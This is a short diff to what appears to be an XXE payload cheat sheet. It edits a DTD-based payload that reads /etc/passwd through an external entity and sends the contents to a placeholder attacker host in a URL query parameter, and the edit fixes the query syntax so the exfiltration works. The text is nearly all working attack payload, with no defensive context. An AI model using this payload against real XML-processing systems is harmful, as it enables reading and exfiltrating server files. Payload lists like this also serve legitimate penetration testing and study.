@@ -58,7 +58,7 @@ XXE: Server Side Request Forgery Example
 XXE: Payload Using DTD File
 
 	<!ENTITY % a SYSTEM 'file:///etc/passwd'>
-	<!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'your website/cookie=?%a;'> " > 
+	<!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'your website/?cookie=%a;'> " > 
 	%b;
 	%c;
 
